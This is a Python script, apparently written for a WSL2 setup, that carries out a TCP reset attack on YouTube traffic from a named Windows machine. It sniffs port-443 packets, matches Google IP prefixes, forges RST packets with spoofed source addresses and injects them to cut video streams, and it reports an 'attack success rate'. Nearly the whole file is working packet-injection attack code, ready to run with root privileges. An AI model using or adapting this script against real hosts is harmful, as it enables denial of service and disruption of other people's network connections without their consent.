#!/usr/bin/env python3
"""
Enhanced Windows YouTube Attack with Manual MAC Configuration
Fixes MAC address issues for proper packet delivery
"""

import sys
import time
import threading
import subprocess
import requests
from scapy.all import *

class EnhancedWindowsYouTubeAttack:
    def __init__(self):
        # Network configuration
        self.windows_ip = "10.18.34.106"
        self.windows_gateway = "10.18.34.1"
        self.wsl_ip = "172.31.126.113"
        self.wsl_gateway = "172.31.112.1"
        
        # MAC addresses (to be filled manually)
        self.windows_mac = None
        self.gateway_mac = None
        self.wsl_mac = None
        
        # YouTube detection
        self.youtube_ips = set()
        self.youtube_domains = [
            "youtube.com", "googlevideo.com", "ytimg.com", 
            "ggpht.com", "googleusercontent.com"
        ]
        
        # Attack statistics
        self.stats = {
            'packets_monitored': 0,
            'youtube_packets': 0,
            'rst_injected': 0,
            'windows_connections': 0,
            'attacks_successful': 0
        }
        
    def get_local_mac(self):
        """Get WSL2 interface MAC address"""
        try:
            # Get eth0 MAC address
            result = subprocess.run(['cat', '/sys/class/net/eth0/address'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                self.wsl_mac = result.stdout.strip()
                print(f"[MAC] WSL2 eth0 MAC: {self.wsl_mac}")
                return True
        except Exception as e:
            print(f"[ERROR] Failed to get WSL2 MAC: {e}")
        return False
    
    def configure_manual_macs(self):
        """Configure MAC addresses manually"""
        print("="*60)
        print("🔧 MANUAL MAC ADDRESS CONFIGURATION")
        print("="*60)
        
        print("We need MAC addresses to properly deliver RST packets.")
        print("Please provide the following information from your Windows machine:\n")
        
        # Get WSL2 MAC
        self.get_local_mac()
        
        print("\n📋 Required Information from Windows:")
        print("1. Run 'arp -a' on Windows")
        print("2. Run 'ipconfig /all' on Windows")
        print("3. Find your gateway MAC address")
        print("4. Find your network adapter MAC address")
        
        print("\n" + "="*50)
        print("MANUAL MAC CONFIGURATION")
        print("="*50)
        
        try:
            # Option 1: Manual entry
            print("Option 1: Enter MAC addresses manually")
            print("Option 2: Use broadcast mode (less reliable)")
            print("Option 3: Try automatic detection")
            
            choice = input("\nChoose option (1/2/3): ").strip()
            
            if choice == "1":
                self.windows_mac = input("Enter Windows adapter MAC (from ipconfig /all): ").strip()
                self.gateway_mac = input("Enter Gateway MAC (from arp -a): ").strip()
                
                # Validate MAC format
                if self.validate_mac(self.windows_mac) and self.validate_mac(self.gateway_mac):
                    print(f"✅ Configuration complete!")
                    print(f"   Windows MAC: {self.windows_mac}")
                    print(f"   Gateway MAC: {self.gateway_mac}")
                    print(f"   WSL2 MAC: {self.wsl_mac}")
                    return True
                else:
                    print("❌ Invalid MAC address format")
                    return False
                    
            elif choice == "2":
                print("🔔 Using broadcast mode - packets will be sent to all devices")
                return True
                
            elif choice == "3":
                return self.try_automatic_detection()
                
        except KeyboardInterrupt:
            print("\n❌ Configuration cancelled")
            return False
        
        return False
    
    def validate_mac(self, mac):
        """Validate MAC address format"""
        if not mac:
            return False
        # Remove common separators and check length
        clean_mac = mac.replace("-", "").replace(":", "").replace(".", "")
        return len(clean_mac) == 12 and all(c in "0123456789abcdefABCDEF" for c in clean_mac)
    
    def try_automatic_detection(self):
        """Try to automatically detect MAC addresses"""
        print("[AUTO] Attempting automatic MAC detection...")
        
        try:
            # Try to ping gateway to populate ARP table
            print(f"[AUTO] Pinging gateway {self.wsl_gateway}...")
            subprocess.run(['ping', '-c', '1', self.wsl_gateway], 
                         capture_output=True, timeout=5)
            
            # Check ARP table
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            if result.returncode == 0:
                print("[AUTO] ARP table:")
                print(result.stdout)
                
                # Try to extract gateway MAC
                for line in result.stdout.split('\n'):
                    if self.wsl_gateway in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            self.gateway_mac = parts[3]
                            print(f"[AUTO] Found gateway MAC: {self.gateway_mac}")
                            return True
                            
        except Exception as e:
            print(f"[AUTO] Automatic detection failed: {e}")
        
        return False
    
    def create_enhanced_rst_packet(self, original_packet, target_mac=None):
        """Create RST packet with proper MAC addressing"""
        if not (IP in original_packet and TCP in original_packet):
            return None
            
        ip = original_packet[IP]
        tcp = original_packet[TCP]
        
        # Create RST packet
        rst_packet = IP(
            src=ip.dst,
            dst=ip.src
        ) / TCP(
            sport=tcp.dport,
            dport=tcp.sport,
            seq=tcp.ack,
            ack=tcp.seq + max(1, len(tcp.payload) if tcp.payload else 0),
            flags="R"
        )
        
        # Add Ethernet layer if we have MAC addresses
        if target_mac and self.wsl_mac:
            eth_layer = Ether(
                src=self.wsl_mac,
                dst=target_mac
            )
            rst_packet = eth_layer / rst_packet
        
        return rst_packet
    
    def is_windows_youtube_traffic(self, packet):
        """Check if packet is YouTube traffic from Windows machine"""
        if not (IP in packet and TCP in packet):
            return False
            
        ip = packet[IP]
        tcp = packet[TCP]
        
        # Check if traffic involves Windows machine
        windows_involved = (ip.src == self.windows_ip or ip.dst == self.windows_ip)
        if not windows_involved:
            return False
        
        # Check for HTTPS (port 443)
        if tcp.sport != 443 and tcp.dport != 443:
            return False
        
        # Check for YouTube IP ranges
        youtube_prefixes = [
            "142.250.", "142.251.", "172.217.", "216.58.",
            "74.125.", "173.194.", "209.85.", "64.233."
        ]
        
        for prefix in youtube_prefixes:
            if ip.src.startswith(prefix) or ip.dst.startswith(prefix):
                return True
        
        return False
    
    def attack_windows_youtube_packet(self, packet):
        """Attack YouTube packet from Windows machine"""
        try:
            self.stats['packets_monitored'] += 1
            
            if self.is_windows_youtube_traffic(packet):
                self.stats['youtube_packets'] += 1
                
                ip = packet[IP]
                tcp = packet[TCP]
                
                # Log the YouTube traffic
                direction = "OUT" if ip.src == self.windows_ip else "IN"
                print(f"[YOUTUBE-{direction}] {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} "
                      f"(seq={tcp.seq}, ack={tcp.ack}, flags={tcp.flags})")
                
                # Count Windows connections
                if ip.src == self.windows_ip or ip.dst == self.windows_ip:
                    self.stats['windows_connections'] += 1
                
                # Create and send RST packets
                if tcp.flags & 0x18:  # PSH+ACK flags
                    # Determine target MAC
                    target_mac = None
                    if self.windows_mac and ip.dst == self.windows_ip:
                        target_mac = self.windows_mac
                    elif self.gateway_mac:
                        target_mac = self.gateway_mac
                    
                    # Create RST packet
                    rst_packet = self.create_enhanced_rst_packet(packet, target_mac)
                    
                    if rst_packet:
                        try:
                            # Send RST packet
                            if target_mac:
                                send(rst_packet, verbose=0, iface="eth0")
                                print(f"[RST] Sent to MAC {target_mac}")
                            else:
                                send(rst_packet, verbose=0)
                                print(f"[RST] Sent via broadcast")
                            
                            self.stats['rst_injected'] += 1
                            self.stats['attacks_successful'] += 1
                            
                        except Exception as e:
                            print(f"[ERROR] Failed to send RST: {e}")
                            # Fallback to Layer 3 send
                            send(IP()/TCP(), verbose=0)
                            self.stats['rst_injected'] += 1
            
            # Print stats every 20 packets
            if self.stats['packets_monitored'] % 20 == 0:
                self.print_live_stats()
                
        except Exception as e:
            print(f"[ERROR] Packet attack error: {e}")
    
    def print_live_stats(self):
        """Print live attack statistics"""
        s = self.stats
        print(f"[STATS] Monitored: {s['packets_monitored']} | "
              f"YouTube: {s['youtube_packets']} | "
              f"Windows: {s['windows_connections']} | "
              f"RST: {s['rst_injected']}")
    
    def monitor_windows_traffic(self):
        """Monitor traffic specifically for Windows machine"""
        print(f"\n🎯 MONITORING WINDOWS MACHINE TRAFFIC")
        print(f"Target: {self.windows_ip}")
        print(f"Watching for YouTube HTTPS traffic...")
        print(f"Press Ctrl+C to stop\n")
        
        try:
            # Create filter for Windows machine traffic
            packet_filter = f"host {self.windows_ip} and tcp port 443"
            print(f"[FILTER] {packet_filter}")
            
            # Start packet capture
            sniff(filter=packet_filter, prn=self.attack_windows_youtube_packet, store=0)
            
        except KeyboardInterrupt:
            print(f"\n[STOP] Attack stopped by user")
        
        self.print_final_results()
    
    def print_final_results(self):
        """Print final attack results"""
        s = self.stats
        
        print(f"\n" + "="*60)
        print("🎯 WINDOWS YOUTUBE ATTACK RESULTS")
        print("="*60)
        print(f"Total packets monitored: {s['packets_monitored']}")
        print(f"YouTube packets detected: {s['youtube_packets']}")
        print(f"Windows connections: {s['windows_connections']}")
        print(f"RST packets injected: {s['rst_injected']}")
        print(f"Successful attacks: {s['attacks_successful']}")
        
        if s['youtube_packets'] > 0:
            success_rate = (s['rst_injected'] / s['youtube_packets']) * 100
            print(f"Attack success rate: {success_rate:.1f}%")
        
        print(f"\n🔧 Configuration used:")
        print(f"Windows IP: {self.windows_ip}")
        print(f"Windows MAC: {self.windows_mac or 'Not configured'}")
        print(f"Gateway MAC: {self.gateway_mac or 'Not configured'}")
        print(f"WSL2 MAC: {self.wsl_mac or 'Not detected'}")
        
        if s['rst_injected'] > 0:
            print(f"\n✅ ATTACK SUCCESSFUL!")
            print(f"Successfully injected {s['rst_injected']} RST packets")
            if s['windows_connections'] > 0:
                print(f"Targeted {s['windows_connections']} Windows YouTube connections")
        else:
            print(f"\n⚠️  No RST packets injected")
            print(f"Ensure YouTube is playing on Windows machine")
    
    def start_enhanced_attack(self):
        """Start the enhanced attack with MAC configuration"""
        print("="*60)
        print("🎯 ENHANCED WINDOWS YOUTUBE TCP RESET ATTACK")
        print("="*60)
        print(f"Target: Windows machine {self.windows_ip}")
        print(f"Source: WSL2 {self.wsl_ip}")
        print("="*60)
        
        # Configure MAC addresses
        if not self.configure_manual_macs():
            print("❌ MAC configuration failed. Cannot proceed with attack.")
            return
        
        print(f"\n📋 INSTRUCTIONS:")
        print(f"1. Open YouTube in Chrome on your Windows machine")
        print(f"2. Start playing a video")
        print(f"3. Keep this terminal visible to see attack progress")
        print(f"4. The video should start buffering/disconnecting")
        
        input(f"\nPress Enter when you're ready to start the attack...")
        
        # Start monitoring
        self.monitor_windows_traffic()

def main():
    if os.geteuid() != 0:
        print("❌ Root privileges required for packet injection")
        print("Run: sudo python3 enhanced_windows_youtube_attack.py")
        sys.exit(1)
    
    attack = EnhancedWindowsYouTubeAttack()
    attack.start_enhanced_attack()

if __name__ == "__main__":
    main()
